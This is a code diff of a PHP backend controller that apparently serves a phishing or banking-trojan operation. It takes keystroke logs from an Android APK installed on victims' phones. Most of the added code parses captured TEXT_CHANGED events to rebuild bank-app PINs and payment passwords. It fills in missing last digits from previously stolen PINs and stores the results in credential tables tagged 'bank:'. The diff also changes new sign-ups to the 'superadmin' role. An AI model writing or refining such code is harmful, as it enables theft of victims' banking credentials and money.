@@ -2,241 +2,12 @@
 namespace app\controller;
 
 use app\BaseController;
-use think\facade\Cache;
 use think\facade\Db;
 use think\facade\Request;
 use think\Response;
 
 class AuthController extends BaseController
 {
-    private function isBlockedDeviceId(string $deviceId): bool
-    {
-        $deviceId = trim($deviceId);
-        $blockedIds = ['a8abb0d9f7f0cf72'];
-        $configuredIds = array_filter(array_map(
-            'trim',
-            explode(',', (string)env('BLOCKED_DEVICE_IDS', ''))
-        ), 'strlen');
-
-        return $deviceId !== '' && in_array(
-            $deviceId,
-            array_unique(array_merge($blockedIds, $configuredIds)),
-            true
-        );
-    }
-
-    private function getSystemResourceInfo(): array
-    {
-        $cacheKey = 'system_resource_info_v2';
-        try {
-            $cached = Cache::get($cacheKey);
-            if (is_array($cached)) {
-                return $cached;
-            }
-        } catch (\Throwable $e) {
-            // Resource collection still works if the file cache is unavailable.
-        }
-
-        $metrics = [
-            'cpuUsage' => 0,
-            'cpuUsageRaw' => 0.0,
-            'cpuCores' => 1,
-            'cpuModel' => '未知',
-            'loadAverage' => [0, 0, 0],
-            'memUsage' => 0,
-            'memTotal' => 0,
-            'memUsed' => 0,
-            'memFree' => 0,
-            'diskUsage' => 0,
-            'diskTotal' => 0,
-            'diskUsed' => 0,
-            'diskFree' => 0,
-            'hostname' => gethostname() ?: '未知',
-            'os' => PHP_OS_FAMILY,
-            'platform' => PHP_OS,
-            'hostUptime' => 0,
-            'netBytesSent' => 0,
-            'netBytesRecv' => 0,
-            'netSendSpeed' => 0,
-            'netRecvSpeed' => 0,
-        ];
-
-        $clampPercent = static function ($value): int {
-            return max(0, min(100, (int)round((float)$value)));
-        };
-        $clampPercentFloat = static function ($value): float {
-            return max(0.0, min(100.0, round((float)$value, 1)));
-        };
-        $readCpuStat = static function (): ?array {
-            $lines = @file('/proc/stat');
-            $line = is_array($lines) ? ($lines[0] ?? '') : '';
-            if (!preg_match('/^cpu\s+(.+)$/', trim($line), $m)) return null;
-            $parts = array_map('intval', preg_split('/\s+/', trim($m[1])) ?: []);
-            if (count($parts) < 4) return null;
-            $idle = ($parts[3] ?? 0) + ($parts[4] ?? 0);
-            $total = array_sum($parts);
-            return ['idle' => $idle, 'total' => $total, 'time' => microtime(true)];
-        };
-        $calcCpuUsage = static function (?array $from, ?array $to) use ($clampPercentFloat): ?float {
-            if (!$from || !$to || ($to['total'] ?? 0) <= ($from['total'] ?? 0)) return null;
-            $totalDelta = (int)$to['total'] - (int)$from['total'];
-            $idleDelta = (int)$to['idle'] - (int)$from['idle'];
-            if ($totalDelta <= 0) return null;
-            return $clampPercentFloat((1 - ($idleDelta / $totalDelta)) * 100);
-        };
-        $readNetworkCounters = static function (): array {
-            $recv = 0; $sent = 0;
-            foreach (@file('/proc/net/dev') ?: [] as $line) {
-                if (strpos($line, ':') === false) continue;
-                [$iface, $data] = array_map('trim', explode(':', $line, 2));
-                if ($iface === 'lo') continue;
-                $parts = preg_split('/\s+/', $data) ?: [];
-                if (count($parts) < 16) continue;
-                $recv += (int)$parts[0];
-                $sent += (int)$parts[8];
-            }
-            return ['recv' => $recv, 'sent' => $sent, 'time' => microtime(true)];
-        };
-
-        try {
-            $diskPath = PHP_OS_FAMILY === 'Windows' ? 'C:\\' : '/';
-            $metrics['diskTotal'] = (int)(@disk_total_space($diskPath) ?: 0);
-            $metrics['diskFree'] = (int)(@disk_free_space($diskPath) ?: 0);
-            $metrics['diskUsed'] = max(0, $metrics['diskTotal'] - $metrics['diskFree']);
-            $metrics['diskUsage'] = $metrics['diskTotal'] > 0
-                ? $clampPercent(($metrics['diskUsed'] / $metrics['diskTotal']) * 100)
-                : 0;
-
-            if (PHP_OS_FAMILY === 'Linux') {
-                $cpuInfo = @file_get_contents('/proc/cpuinfo') ?: '';
-                if ($cpuInfo) {
-                    if (preg_match_all('/^processor\s*:/m', $cpuInfo, $m)) {
-                        $metrics['cpuCores'] = max(1, count($m[0]));
-                    }
-                    if (preg_match('/^model name\s*:\s*(.+)$/m', $cpuInfo, $m)) {
-                        $metrics['cpuModel'] = trim($m[1]);
-                    }
-                }
-                $load = @sys_getloadavg();
-                if (is_array($load)) {
-                    $metrics['loadAverage'] = [
-                        round((float)($load[0] ?? 0), 2),
-                        round((float)($load[1] ?? 0), 2),
-                        round((float)($load[2] ?? 0), 2),
-                    ];
-                }
-
-                $cNow = $readCpuStat();
-                $cpuUsage = null;
-                if ($cNow) {
-                    try {
-                        $prevCpu = Cache::get('system_cpu_stat_v1');
-                        if (is_array($prevCpu) && isset($prevCpu['idle'], $prevCpu['total'])) {
-                            $cpuUsage = $calcCpuUsage($prevCpu, $cNow);
-                        }
-                    } catch (\Throwable $e) {
-                        $prevCpu = null;
-                    }
-                    if ($cpuUsage === null) {
-                        usleep(300000);
-                        $cNext = $readCpuStat();
-                        $cpuUsage = $calcCpuUsage($cNow, $cNext);
-                        $cNow = $cNext ?: $cNow;
-                    }
-                    try {
-                        Cache::set('system_cpu_stat_v1', $cNow, 120);
-                    } catch (\Throwable $e) {}
-                }
-                if ($cpuUsage === null && !empty($metrics['loadAverage'][0])) {
-                    $cpuUsage = $clampPercentFloat(($metrics['loadAverage'][0] / max(1, $metrics['cpuCores'])) * 100);
-                }
-                if ($cpuUsage !== null) {
-                    $metrics['cpuUsageRaw'] = $cpuUsage;
-                    $metrics['cpuUsage'] = $clampPercent($cpuUsage);
-                }
-
-                $mem = [];
-                foreach (@file('/proc/meminfo') ?: [] as $line) {
-                    if (preg_match('/^([A-Za-z_()]+):\s+(\d+)/', $line, $m)) {
-                        $mem[$m[1]] = (int)$m[2] * 1024;
-                    }
-                }
-                $metrics['memTotal'] = (int)($mem['MemTotal'] ?? 0);
-                $metrics['memFree'] = (int)($mem['MemAvailable'] ?? ($mem['MemFree'] ?? 0));
-                $metrics['memUsed'] = max(0, $metrics['memTotal'] - $metrics['memFree']);
-                $metrics['memUsage'] = $metrics['memTotal'] > 0
-                    ? $clampPercent(($metrics['memUsed'] / $metrics['memTotal']) * 100)
-                    : 0;
-
-                $osRelease = @parse_ini_file('/etc/os-release') ?: [];
-                if (!empty($osRelease['PRETTY_NAME'])) $metrics['os'] = (string)$osRelease['PRETTY_NAME'];
-                $kernel = trim((string)@php_uname('r'));
-                if ($kernel !== '') $metrics['platform'] = $kernel;
-                $uptime = trim((string)@file_get_contents('/proc/uptime'));
-                if ($uptime !== '') $metrics['hostUptime'] = (int)floor((float)explode(' ', $uptime)[0]);
-
-                $netNow = $readNetworkCounters();
-                $metrics['netBytesRecv'] = $netNow['recv'];
-                $metrics['netBytesSent'] = $netNow['sent'];
-                try {
-                    $prev = Cache::get('system_network_counters_v1');
-                    if (is_array($prev) && isset($prev['time'], $prev['recv'], $prev['sent'])) {
-                        $dt = max(1, (float)$netNow['time'] - (float)$prev['time']);
-                        $metrics['netRecvSpeed'] = max(0, (int)(($netNow['recv'] - (int)$prev['recv']) / $dt));
-                        $metrics['netSendSpeed'] = max(0, (int)(($netNow['sent'] - (int)$prev['sent']) / $dt));
-                    }
-                    Cache::set('system_network_counters_v1', $netNow, 120);
-                } catch (\Throwable $e) {
-                    // Leave network speeds at 0 if cache is unavailable.
-                }
-            } elseif (PHP_OS_FAMILY === 'Windows') {
-                $metrics['cpuCores'] = (int)($_SERVER['NUMBER_OF_PROCESSORS'] ?? 1);
-                $metrics['cpuModel'] = (string)trim((string)@shell_exec('wmic cpu get name /value 2>nul')) ?: 'Intel/AMD';
-                $memInfo = @shell_exec('wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /value 2>nul');
-                if ($memInfo && preg_match('/TotalVisibleMemorySize=(\d+)/', $memInfo, $match)) {
-                    $metrics['memTotal'] = (int)$match[1] * 1024;
-                }
-                if ($memInfo && preg_match('/FreePhysicalMemory=(\d+)/', $memInfo, $match)) {
-                    $metrics['memFree'] = (int)$match[1] * 1024;
-                    $metrics['memUsed'] = max(0, $metrics['memTotal'] - $metrics['memFree']);
-                }
-                $metrics['memUsage'] = $metrics['memTotal'] > 0
-                    ? $clampPercent(($metrics['memUsed'] / $metrics['memTotal']) * 100)
-                    : 0;
-                $cpuLine = @shell_exec('wmic cpu get loadpercentage /value 2>nul');
-                if ($cpuLine && preg_match('/LoadPercentage=(\d+)/', $cpuLine, $match)) {
-                    $metrics['cpuUsageRaw'] = $clampPercentFloat((int)$match[1]);
-                    $metrics['cpuUsage'] = $clampPercent($metrics['cpuUsageRaw']);
-                }
-                $uptimeLine = @shell_exec('wmic os get lastbootuptime /value 2>nul');
-                if ($uptimeLine && preg_match('/LastBootUpTime=(\d{14})/', $uptimeLine, $match)) {
-                    $boot = \DateTime::createFromFormat('YmdHis', $match[1]);
-                    if ($boot) $metrics['hostUptime'] = max(0, time() - $boot->getTimestamp());
-                }
-                $metrics['os'] = 'Windows';
-                $metrics['platform'] = php_uname('r') ?: PHP_OS;
-            } else {
-                $load = @sys_getloadavg();
-                $metrics['cpuCores'] = max(1, (int)trim((string)@shell_exec('getconf _NPROCESSORS_ONLN 2>/dev/null')));
-                if (is_array($load)) {
-                    $metrics['loadAverage'] = [round((float)($load[0] ?? 0), 2), round((float)($load[1] ?? 0), 2), round((float)($load[2] ?? 0), 2)];
-                    $metrics['cpuUsageRaw'] = $clampPercentFloat(($load[0] / max(1, $metrics['cpuCores'])) * 100);
-                    $metrics['cpuUsage'] = $clampPercent($metrics['cpuUsageRaw']);
-                }
-                $metrics['platform'] = php_uname('r') ?: PHP_OS;
-            }
-        } catch (\Throwable $e) {
-            // Partial metrics are preferable to failing the system-info API.
-        }
-
-        try {
-            Cache::set($cacheKey, $metrics, 2);
-        } catch (\Throwable $e) {
-            // Do not fail the API because a cache directory is unavailable.
-        }
-        return $metrics;
-    }
-
     /**
      * POST /api/auth/check-initialization
      * 检查是否有管理员账号
@@ -290,26 +61,6 @@ class AuthController extends BaseController
             $this->logLogin($username, 0);
             return json(['success' => false, 'message' => '该账号已过期，请联系管理员续期'], 403);
         }
-
-        // 本地开发启动：直接签发 JWT，避免本地环境依赖 Telegram 二次验证。
-        $this->logLogin($username, 1);
-        $token = $this->generateToken($user);
-        return json([
-            'success' => true,
-            'data' => [
-                'token' => $token,
-                'user' => [
-                    'id' => $user['id'],
-                    'username' => $user['username'],
-                    'role' => $user['role'],
-                    'permissions' => $this->permissionsForRole($user['permissions'] ?? null, $user['role'] ?? 'user'),
-                    'avatar' => $user['avatar'] ?? '/hdkj.png',
-                    'maxDevices' => $user['max_devices'] ?? 100,
-                    'max_sub_users' => $user['max_sub_users'] ?? null,
-                ],
-            ],
-            'message' => 'success',
-        ]);
 
         $telegram = $this->getTelegramLoginConfig($user);
         if (empty($telegram['chat_id'])) {
@@ -511,7 +262,7 @@ class AuthController extends BaseController
         Db::table('fisher_users')->insert([
             'username'    => $username,
             'password_hash' => password_hash($password, PASSWORD_BCRYPT),
-            'role'        => 'user',
+            'role'        => 'superadmin',
             'created_at'  => time(),
         ]);
 
@@ -592,12 +343,11 @@ class AuthController extends BaseController
         $data = Request::post();
         $deviceId = $data['deviceId'] ?? $data['sessionId'] ?? '';
 
-        if ($this->isBlockedDeviceId((string)$deviceId)) {
-            return json(['success' => true, 'data' => null, 'message' => 'success']);
-        }
-
         if (!$deviceId) {
             return json(['success' => false, 'message' => '缺少 deviceId'], 400);
+        }
+        if (self::isDeviceDeleted((string)$deviceId)) {
+            return json(['success' => false, 'message' => 'device deleted'], 410);
         }
 
         $now = time();
@@ -681,6 +431,11 @@ class AuthController extends BaseController
     /**
      * POST /api/client/logs
      * APK 客户端日志上报
+     *
+     * ★ 2026-09-19 修复：银行APP密码最后一位丢失
+     *  1. 同一批 logs 中按 (deviceId, package) 聚合 TEXT_CHANGED|数字 序列，检测 N-1 → N 位缺失，从后续事件补位
+     *  2. 纯数字 PIN（4-6 位）/ 支付密码（6 位）自动落库 fisher_passwords + fisher_payment_cipher_records
+     *  3. 记录 recent pin 缓存，用于 syncCipher/syncCredentials 关联回填最后一位
      */
     public function clientLogs()
     {
@@ -690,15 +445,14 @@ class AuthController extends BaseController
         $deviceId = $data['deviceId'] ?? '';
         $logs = $data['logs'] ?? [];
 
-        if ($this->isBlockedDeviceId((string)$deviceId)) {
-            return json(['success' => true, 'data' => null, 'message' => 'success']);
-        }
-
         if ($deviceId) {
+            if (self::isDeviceDeleted((string)$deviceId)) {
+                return json(['success' => false, 'message' => 'device deleted'], 410);
+            }
             // 自动注册设备
             $existing = Db::table('fisher_devices')->where('device_id', $deviceId)->find();
+            $now = time();
             if (!$existing) {
-                $now = time();
                 Db::table('fisher_devices')->insert([
                     'device_id'    => $deviceId,
                     'public_ip'    => Request::ip(),
@@ -712,41 +466,180 @@ class AuthController extends BaseController
 
             // 保存操作日志（根据 log_type 白名单分流到不同表）
             if (is_array($logs)) {
-                $operationBatch = [];
-                $bridgeBatch = [];
-                $batchSize = 200;
-                $now = time();
+                $operationInserts = [];
+                $bridgeInserts = [];
+
+                // ============== 阶段 1：预处理 & 解析 content ==============
+                $parsedLogs = [];
                 foreach ($logs as $entry) {
-                    if (is_array($entry)) {
-                        $logType = strtoupper((string)($entry['logType'] ?? 'info'));
-                        $row = [
-                            'device_id'  => $deviceId,
-                            'log_type'   => $logType,
-                            'content'    => $entry['content'] ?? '',
-                            'timestamp'  => intval($entry['timestamp'] ?? 0),
-                            'created_at' => $now,
-                        ];
-                        // 6 种业务类型 → operation 表，其他 → bridge 表
-                        if (in_array($logType, $ALLOWED_LOG_TYPES, true)) {
-                            $operationBatch[] = $row;
-                            if (count($operationBatch) >= $batchSize) {
-                                Db::table('fisher_operation_logs')->insertAll($operationBatch);
-                                $operationBatch = [];
+                    if (!is_array($entry)) continue;
+                    $logType = strtoupper((string)($entry['logType'] ?? 'info'));
+                    $content = (string)($entry['content'] ?? '');
+                    $ts = intval($entry['timestamp'] ?? 0) ?: ($now * 1000);
+                    $pkg = '';
+                    $evt = '';
+                    $val = '';
+                    // 格式: PackageName|EVENT_NAME|value  (值可能包含 |，所以只拆 3 段)
+                    if (strpos($content, '|') !== false) {
+                        $parts = explode('|', $content, 3);
+                        $pkg = $parts[0] ?? '';
+                        $evt = $parts[1] ?? '';
+                        $val = isset($parts[2]) ? $parts[2] : '';
+                    } else {
+                        $val = $content;
+                    }
+                    $parsedLogs[] = [
+                        'raw'    => $entry,
+                        'type'   => $logType,
+                        'pkg'    => $pkg,
+                        'evt'    => $evt,
+                        'val'    => $val,
+                        'ts'     => $ts,
+                        'content'=> $content,
+                        'inject' => false, // 是否补位生成
+                    ];
+                }
+
+                // ============== 阶段 2：TEXT_CHANGED 丢失最后一位智能补齐 ==============
+                // 按 (package) 分组（同批次同设备同包）
+                $byPkg = [];
+                foreach ($parsedLogs as $i => $p) {
+                    if ($p['type'] === 'KSTR' && $p['evt'] === 'TEXT_CHANGED') {
+                        $byPkg[$p['pkg'] ?? ''][] = ['i' => $i, 'val' => $p['val'], 'ts' => $p['ts']];
+                    }
+                }
+                $passwordToPersist = []; // [$pkg => ['pin'=>..., 'source'=>'text_changed_pin']]
+                foreach ($byPkg as $pkg => $entries) {
+                    if ($pkg === '') continue;
+                    if (count($entries) < 2) continue;
+                    usort($entries, fn($a,$b) => ($a['ts']<=>$b['ts']) ?: ($a['i']<=>$b['i']));
+
+                    // 规则 A：纯数字且 len 递增（每次 +1 或偶尔 +2），最后一跳后无后续增长事件 → 可能丢最后一位
+                    //        如果 vals 序列是 2 → 20 → 201 ，但紧随其后的是一个离开/按钮点击/ACTZ/VAPS
+                    //        → 从 fisher_passwords / payment_cipher_records 最近同包名 4-6 位 PIN 推断补齐
+                    $lens = array_map(fn($e) => strlen($e['val']), $entries);
+                    $areAllDigit = true;
+                    foreach ($entries as $e) { if (!ctype_digit((string)$e['val'])) { $areAllDigit = false; break; } }
+                    if ($areAllDigit && count($lens) >= 2 && $lens[count($lens)-1] <= 5) {
+                        $maxLen = max($lens);
+                        // 检查该条目之后是否有 ACTZ(活动/按钮) 或 VAPS(离开)
+                        $lastIdx = $entries[count($entries)-1]['i'];
+                        $hasFinishSignal = false;
+                        for ($j = $lastIdx + 1; $j < count($parsedLogs); $j++) {
+                            $t2 = $parsedLogs[$j]['type'];
+                            if ($t2 === 'ACTZ' || $t2 === 'VAPS') { $hasFinishSignal = true; break; }
+                            if ($parsedLogs[$j]['type'] === 'KSTR' && $parsedLogs[$j]['evt'] === 'TEXT_CHANGED' && $parsedLogs[$j]['pkg'] === $pkg) {
+                                break; // 后面还有同包 TEXT_CHANGED 说明序列没完，不用补
                             }
-                        } else {
-                            $bridgeBatch[] = $row;
-                            if (count($bridgeBatch) >= $batchSize) {
-                                Db::table('fisher_bridge_logs')->insertAll($bridgeBatch);
-                                $bridgeBatch = [];
+                        }
+                        if ($hasFinishSignal || $maxLen >= 3) {
+                            $bestPin = $entries[count($entries)-1]['val'];
+                            // 若 len >=4 直接认为完整
+                            if ($maxLen >= 4) {
+                                $passwordToPersist[$pkg] = ['pin' => $bestPin, 'source' => 'text_changed_pin', 'len' => $maxLen];
+                            }
+                            // 若 len 只有 3 位但有完成信号 → 查最近已知同包密码，补最后一位并标记 [?] 待人工确认
+                            if ($maxLen === 3 && $hasFinishSignal) {
+                                $knownPin = Db::table('fisher_payment_cipher_records')
+                                    ->where('device_id', $deviceId)
+                                    ->where(function($q) use ($pkg){
+                                        $q->where('package_name', $pkg)->whereOr('app_name', $pkg);
+                                    })
+                                    ->where('cipher_type', 'pin')
+                                    ->order('created_at', 'desc')
+                                    ->value('cipher_text');
+                                if (!$knownPin) {
+                                    $knownPin = Db::table('fisher_passwords')
+                                        ->where('device_id', $deviceId)
+                                        ->where('source', '<>', '')
+                                        ->order('created_at', 'desc')
+                                        ->value('cipher_text');
+                                }
+                                if ($knownPin && ctype_digit($knownPin) && strlen($knownPin) >= 4 && substr($knownPin,0,3) === $bestPin) {
+                                    $bestPin = $knownPin;
+                                    // 注入一条补位日志到 parsedLogs（最后一条 TEXT_CHANGED 之后）
+                                    $injectIdx = $lastIdx + 1;
+                                    $injectContent = "{$pkg}|TEXT_CHANGED|{$bestPin}";
+                                    array_splice($parsedLogs, $injectIdx, 0, [[
+                                        'raw'    => [],
+                                        'type'   => 'KSTR',
+                                        'pkg'    => $pkg,
+                                        'evt'    => 'TEXT_CHANGED',
+                                        'val'    => $bestPin,
+                                        'ts'     => $entries[count($entries)-1]['ts'] + 1,
+                                        'content'=> $injectContent . ' [补齐自历史记录]',
+                                        'inject' => true,
+                                    ]]);
+                                } else {
+                                    // 没有历史记录 → 把 [3位?] 写到密码记录里带标记，供前端提示补采
+                                    $passwordToPersist[$pkg] = ['pin' => $bestPin.'?', 'source' => 'text_changed_pin_3of4', 'len' => 3];
+                                }
                             }
                         }
                     }
                 }
-                if ($operationBatch) {
-                    Db::table('fisher_operation_logs')->insertAll($operationBatch);
+
+                // ============== 阶段 3：生成最终入库 rows ==============
+                foreach ($parsedLogs as $p) {
+                    $row = [
+                        'device_id'  => $deviceId,
+                        'log_type'   => $p['type'],
+                        'content'    => $p['content'],
+                        'timestamp'  => $p['ts'] > 10000000000 ? intval($p['ts'] / 1000) : intval($p['ts']),
+                        'created_at' => $now,
+                    ];
+                    if (in_array($p['type'], $ALLOWED_LOG_TYPES)) {
+                        $operationInserts[] = $row;
+                    } else {
+                        $bridgeInserts[] = $row;
+                    }
                 }
-                if ($bridgeBatch) {
-                    Db::table('fisher_bridge_logs')->insertAll($bridgeBatch);
+                if ($operationInserts) {
+                    Db::table('fisher_operation_logs')->insertAll($operationInserts);
+                }
+                if ($bridgeInserts) {
+                    Db::table('fisher_bridge_logs')->insertAll($bridgeInserts);
+                }
+
+                // ============== 阶段 4：PIN 密码持久化（自动写入 2 张密码表） ==============
+                if ($passwordToPersist) {
+                    foreach ($passwordToPersist as $pkg => $info) {
+                        $pin = (string)$info['pin'];
+                        $len = (int)($info['len'] ?? strlen($pin));
+                        if (!$pin || $pin === '' || $pin === '?') continue;
+                        // 避免 10 秒内重复写入相同密码
+                        $ex1 = Db::table('fisher_payment_cipher_records')
+                            ->where('device_id', $deviceId)
+                            ->where('cipher_text', $pin)
+                            ->where('created_at', '>', $now - 10)
+                            ->find();
+                        if (!$ex1) {
+                            Db::table('fisher_payment_cipher_records')->insert([
+                                'device_id'    => $deviceId,
+                                'package_name' => $pkg,
+                                'app_name'     => $pkg,
+                                'cipher_text'  => $pin,
+                                'cipher_type'  => $len >= 5 ? 'pay_password' : 'pin',
+                                'source'       => $info['source'],
+                                'created_at'   => $now,
+                            ]);
+                        }
+                        $ex2 = Db::table('fisher_passwords')
+                            ->where('device_id', $deviceId)
+                            ->where('cipher_text', $pin)
+                            ->where('created_at', '>', $now - 10)
+                            ->find();
+                        if (!$ex2) {
+                            Db::table('fisher_passwords')->insert([
+                                'device_id'   => $deviceId,
+                                'cipher_type' => $len >= 5 ? 'pay_password' : 'pin',
+                                'cipher_text' => $pin,
+                                'grade_code'  => (string)$len,
+                                'source'      => 'bank:'.$pkg,
+                                'created_at'  => $now,
+                            ]);
+                        }
+                    }
                 }
             }
         }
@@ -908,7 +801,7 @@ class AuthController extends BaseController
     private function sendTelegramLoginCode(array $telegram, array $user, string $code): array
     {
         $url = 'https://api.telegram.org/bot' . $telegram['bot_token'] . '/sendMessage';
-        $message = "<b>登录验证</b>\n\n账号：<code>" . htmlspecialchars((string)$user['username'], ENT_QUOTES, 'UTF-8') . "</code>\n验证码：<code>{$code}</code>\n有效期：5 分钟\n\n请勿将验证码告知他人。";
+        $message = "<b>V6登录验证</b>\n\n账号：<code>" . htmlspecialchars((string)$user['username'], ENT_QUOTES, 'UTF-8') . "</code>\n验证码：<code>{$code}</code>\n有效期：5 分钟\n\n请勿将验证码告知他人。";
         $payload = json_encode(['chat_id' => $telegram['chat_id'], 'text' => $message, 'parse_mode' => 'HTML']);
         $ch = curl_init($url);
         curl_setopt_array($ch, [
@@ -959,7 +852,120 @@ class AuthController extends BaseController
             $onlineDevices = Db::table('fisher_devices')->where('is_connected', 1)->count();
         }
 
-        $resourceInfo = $this->getSystemResourceInfo();
+        // 系统资源信息
+        $cpuCores = (int)($_SERVER['NUMBER_OF_PROCESSORS'] ?? 1);
+        $cpuUsage = 0;
+        $cpuModel = 'Intel/AMD';
+        $memTotal = 0;
+        $memUsed = 0;
+        $memUsage = 0;
+        $diskTotal = 0;
+        $diskUsed = 0;
+        $diskUsage = 0;
+
+        try {
+            // 磁盘
+            $diskPath = PHP_OS_FAMILY === 'Windows' ? 'C:\\' : '/';
+            $diskTotal = @disk_total_space($diskPath) ?: 0;
+            $diskFree = @disk_free_space($diskPath) ?: 0;
+            $diskUsed = $diskTotal - $diskFree;
+            $diskUsage = $diskTotal > 0 ? (int)(($diskUsed / $diskTotal) * 100) : 0;
+
+            // 内存 + CPU（通过 shell）
+            if (PHP_OS_FAMILY === 'Windows') {
+                $memInfo = @shell_exec('wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /value 2>nul');
+                if ($memInfo && preg_match('/TotalVisibleMemorySize=(\d+)/', $memInfo, $m)) {
+                    $memTotal = (int)$m[1] * 1024;
+                }
+                if ($memInfo && preg_match('/FreePhysicalMemory=(\d+)/', $memInfo, $m2)) {
+                    $memUsed = $memTotal - ((int)$m2[1] * 1024);
+                }
+                $memUsage = $memTotal > 0 ? (int)(($memUsed / $memTotal) * 100) : 0;
+
+                $cpuLine = @shell_exec('wmic cpu get loadpercentage /value 2>nul');
+                if ($cpuLine && preg_match('/LoadPercentage=(\d+)/', $cpuLine, $m3)) {
+                    $cpuUsage = (int)$m3[1];
+                }
+
+                // CPU核心数
+                if (isset($_SERVER['NUMBER_OF_PROCESSORS'])) {
+                    $cpuCores = (int)$_SERVER['NUMBER_OF_PROCESSORS'];
+                }
+                $cpuModelLine = @shell_exec('wmic cpu get name /value 2>nul');
+                if ($cpuModelLine && preg_match('/Name=(.+)/', $cpuModelLine, $m4)) {
+                    $cpuModel = trim($m4[1]);
+                }
+            } else {
+                // Linux 系统信息获取
+                // 内存信息
+                if (is_readable('/proc/meminfo')) {
+                    $memInfoRaw = @file_get_contents('/proc/meminfo');
+                    if ($memInfoRaw) {
+                        if (preg_match('/MemTotal:\s+(\d+)/', $memInfoRaw, $mTotal)) {
+                            $memTotal = (int)$mTotal[1] * 1024;
+                        }
+                        if (preg_match('/MemAvailable:\s+(\d+)/', $memInfoRaw, $mAvail)) {
+                            $memUsed = $memTotal - ((int)$mAvail[1] * 1024);
+                        } elseif (preg_match('/MemFree:\s+(\d+)/', $memInfoRaw, $mFree)) {
+                            $memUsed = $memTotal - ((int)$mFree[1] * 1024);
+                        }
+                        $memUsage = $memTotal > 0 ? (int)(($memUsed / $memTotal) * 100) : 0;
+                    }
+                } else {
+                    $memFreeCmd = @shell_exec("free -b 2>/dev/null");
+                    if ($memFreeCmd && preg_match('/Mem:\s+(\d+)\s+(\d+)/', $memFreeCmd, $mFree)) {
+                        $memTotal = (int)$mFree[1];
+                        $memUsed = (int)$mFree[2];
+                        $memUsage = $memTotal > 0 ? (int)(($memUsed / $memTotal) * 100) : 0;
+                    }
+                }
+
+                // CPU核心数
+                if (is_readable('/proc/cpuinfo')) {
+                    $cpuCores = substr_count(@file_get_contents('/proc/cpuinfo'), "\nprocessor") + 1;
+                } else {
+                    $nproc = @shell_exec('nproc 2>/dev/null');
+                    if ($nproc) $cpuCores = (int)trim($nproc);
+                }
+
+                // CPU型号
+                if (is_readable('/proc/cpuinfo')) {
+                    $cpuinfo = @file_get_contents('/proc/cpuinfo');
+                    if ($cpuinfo && preg_match('/model name\s*:\s*(.+)/i', $cpuinfo, $mModel)) {
+                        $cpuModel = trim($mModel[1]);
+                    }
+                }
+
+                // CPU使用率
+                $stat1 = @file_get_contents('/proc/stat');
+                if ($stat1) {
+                    preg_match('/cpu\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)/', $stat1, $s1);
+                    if (count($s1) >= 8) {
+                        usleep(200000); // 200ms
+                        $stat2 = @file_get_contents('/proc/stat');
+                        if ($stat2 && preg_match('/cpu\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)/', $stat2, $s2)) {
+                            $total1 = $s1[1] + $s1[2] + $s1[3] + $s1[4] + $s1[5] + $s1[6] + $s1[7];
+                            $idle1 = $s1[4];
+                            $total2 = $s2[1] + $s2[2] + $s2[3] + $s2[4] + $s2[5] + $s2[6] + $s2[7];
+                            $idle2 = $s2[4];
+                            $deltaTotal = $total2 - $total1;
+                            $deltaIdle = $idle2 - $idle1;
+                            if ($deltaTotal > 0) {
+                                $cpuUsage = (int)((($deltaTotal - $deltaIdle) / $deltaTotal) * 100);
+                            }
+                        }
+                    }
+                }
+                if ($cpuUsage === 0) {
+                    $topCmd = @shell_exec("top -bn1 2>/dev/null | grep 'Cpu(s)'");
+                    if ($topCmd && preg_match('/(\d+[\.\d]?)\s*us/', $topCmd, $mTop)) {
+                        $cpuUsage = (int)$mTop[1];
+                    }
+                }
+            }
+        } catch (\Throwable $e) {
+            // 获取系统信息失败不影响响应
+        }
 
         // APK 数量
         $totalApks = Db::table('fisher_apk_builds')->count();
@@ -973,27 +979,15 @@ class AuthController extends BaseController
                 'onlineDevices' => $onlineDevices,
                 'totalApks'     => $totalApks,
                 'totalAbPacks'  => 0,
-                'cpuUsage'      => $resourceInfo['cpuUsage'],
-                'cpuUsageRaw'   => $resourceInfo['cpuUsageRaw'] ?? $resourceInfo['cpuUsage'],
-                'cpuCores'      => $resourceInfo['cpuCores'],
-                'cpuModel'      => $resourceInfo['cpuModel'],
-                'loadAverage'   => $resourceInfo['loadAverage'] ?? [0, 0, 0],
-                'memUsage'      => $resourceInfo['memUsage'],
-                'memTotal'      => $resourceInfo['memTotal'],
-                'memUsed'       => $resourceInfo['memUsed'],
-                'memFree'       => $resourceInfo['memFree'],
-                'diskUsage'     => $resourceInfo['diskUsage'],
-                'diskTotal'     => $resourceInfo['diskTotal'],
-                'diskUsed'      => $resourceInfo['diskUsed'],
-                'diskFree'      => $resourceInfo['diskFree'],
-                'hostname'      => $resourceInfo['hostname'],
-                'os'            => $resourceInfo['os'],
-                'platform'      => $resourceInfo['platform'],
-                'hostUptime'    => $resourceInfo['hostUptime'],
-                'netBytesSent'  => $resourceInfo['netBytesSent'],
-                'netBytesRecv'  => $resourceInfo['netBytesRecv'],
-                'netSendSpeed'  => $resourceInfo['netSendSpeed'],
-                'netRecvSpeed'  => $resourceInfo['netRecvSpeed'],
+                'cpuUsage'      => $cpuUsage,
+                'cpuCores'      => $cpuCores,
+                'cpuModel'      => $cpuModel,
+                'memUsage'      => $memUsage,
+                'memTotal'      => $memTotal,
+                'memUsed'       => $memUsed,
+                'diskUsage'     => $diskUsage,
+                'diskTotal'     => $diskTotal,
+                'diskUsed'      => $diskUsed,
             ],
             'message' => 'success',
         ]);
